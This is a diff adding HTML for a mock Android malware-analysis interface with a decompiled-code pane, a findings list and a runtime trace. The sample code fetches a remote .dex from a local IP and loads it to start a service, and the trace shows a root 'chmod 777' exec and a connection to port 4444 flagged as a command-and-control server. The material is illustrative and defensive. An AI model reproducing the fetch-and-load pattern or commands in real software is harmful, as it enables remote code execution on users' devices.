+    <span class="text-tertiary">protected void</span> onCreate(Bundle saved) {
+        <span class="text-tertiary">super</span>.onCreate(saved);
+        
+        <span class="text-outline italic">// !! HIGH RISK: Dynamic payload fetching detected</span>
+        String remoteUrl = <span class="text-error">"http://192.168.1.100/p.dex"</span>;
+        DexClassLoader cl = <span class="text-tertiary">new</span> DexClassLoader(remoteUrl);
+        
+        <span class="text-tertiary">this</span>.startService(<span class="text-tertiary">new</span> Intent(cl.loadClass(<span class="text-error">"P"</span>)));
+    }
+}</code></pre>
+</div>
+</div>
+<!-- Security Findings Pane -->
+<div class="h-48 tui-border-t flex flex-col overflow-hidden">
+<div class="h-8 bg-surface-container px-4 flex items-center tui-border-b text-[11px]">
+<span class="material-symbols-outlined text-[14px] text-error mr-2">search_check</span>
+<span>ANALYSIS_FINDINGS: 3_THREATS_DETECTED</span>
+</div>
+<div class="flex-1 p-4 overflow-y-auto custom-scrollbar flex flex-col gap-2">
+<div class="tui-border p-2 flex items-center gap-3 bg-error/5 border-error/20">
+<span class="text-error font-bold">[!!]</span>
+<div class="flex-1">
+<div class="text-error text-[11px] font-bold">SMS_HIJACKING_ATTEMPT</div>
+<div class="text-[10px] text-outline uppercase">Confidence: 0.98 | Impact: High</div>
+</div>
+</div>
+<div class="tui-border p-2 flex items-center gap-3 bg-surface-container-high">
+<span class="text-outline font-bold">[??]</span>
+<div class="flex-1">
+<div class="text-on-surface text-[11px] font-bold">REFLECTIVE_METHOD_INVOCATION</div>
+<div class="text-[10px] text-outline uppercase">Confidence: 0.72 | Impact: Medium</div>
+</div>
+</div>
+<div class="tui-border p-2 flex items-center gap-3 bg-tertiary/5 border-tertiary/20">
+<span class="text-tertiary font-bold">[OK]</span>
+<div class="flex-1">
+<div class="text-tertiary text-[11px] font-bold">HARDCODED_AES_IV</div>
+<div class="text-[10px] text-outline uppercase">Confidence: 1.00 | Impact: Low</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<!-- Right Side: Live Trace (Full Height) -->
+<div class="w-[440px] flex flex-col overflow-hidden">
+<div class="h-8 bg-surface-container px-4 flex items-center justify-between tui-border-b text-[11px]">
+<div class="flex items-center gap-2">
+<span class="w-2 h-2 bg-tertiary animate-pulse"></span>
+<span>RUNTIME_TRACE: PID_4892</span>
+</div>
+<div class="flex gap-2">
+<button class="text-tertiary hover:underline text-[10px]">SAVE_LOG</button>
+</div>
+</div>
+<div class="flex-1 p-4 text-[12px] overflow-y-auto custom-scrollbar space-y-3 bg-black/30">
+<div class="text-outline">00:00:00:000 [SYS] Process spawned: zygote64</div>
+<div class="text-outline">00:00:00:125 [SYS] Loading native libs: libart.so</div>
+<div class="pl-3 border-l-2 border-tertiary/50">
+<div class="text-tertiary font-bold">&gt;&gt;&gt; CALL: java.lang.Runtime.exec()</div>
+<div class="text-[10px] text-on-surface-variant font-mono">ARGS: "su -c 'chmod 777 /data/local/tmp'"</div>
+</div>
+<div class="text-outline">00:00:01:450 [SYS] GC_FOR_ALLOC freed 1024K</div>
+<div class="tui-border p-2 bg-error/10 border-error/30">
+<div class="flex items-center gap-2 font-bold text-error text-[11px]">
+<span class="material-symbols-outlined text-[14px]">wifi_tethering</span>
+                            NETWORK_EVENT_TRIGGERED
+                        </div>
+<div class="mt-1 text-on-surface">CONNECT: 192.168.1.100:4444</div>
+<div class="text-[10px] text-outline italic">SIG_MATCH: C2_SERVER_PATTERN_#441-A</div>
+</div>
+<div class="text-outline animate-pulse mt-4">_ SYSTEM_LISTENING_FOR_HOOKS...</div>
+</div>
+<!-- Trace Controls -->
+<div class="h-10 tui-border-t bg-surface-container-low flex items-center justify-center gap-6">
+<button class="text-tertiary hover:text-on-surface flex items-center gap-1 text-[11px]">
+<span class="material-symbols-outlined text-[18px]">play_arrow</span> RUN
+                    </button>
+<button class="text-error hover:text-on-surface flex items-center gap-1 text-[11px]">
+<span class="material-symbols-outlined text-[18px]">stop</span> STOP
+                    </button>
+<button class="text-outline hover:text-on-surface flex items-center gap-1 text-[11px]">
+<span class="material-symbols-outlined text-[18px]">refresh</span> RESET
+                    </button>
+</div>
+</div>
+</div>
+<!-- Status Bar -->
+<footer class="h-6 bg-surface-container-high tui-border-t px-4 flex items-center justify-between text-[10px] uppercase tracking-tighter">
+<div class="flex items-center gap-6">
+<span class="text-tertiary">STATUS: READY</span>
+<span class="text-outline">MEMORY: 1.2GB / 4.0GB</span>
+<span class="text-outline">KERNEL: EMULATOR-X86_64</span>
+</div>
+<div class="flex items-center gap-4">
+<span class="text-outline">ENCRYPTION: AES-256-GCM</span>
+<span class="text-on-surface">v4.2.0-STABLE</span>
+</div>
+</footer>
+</main>
+</body></html>
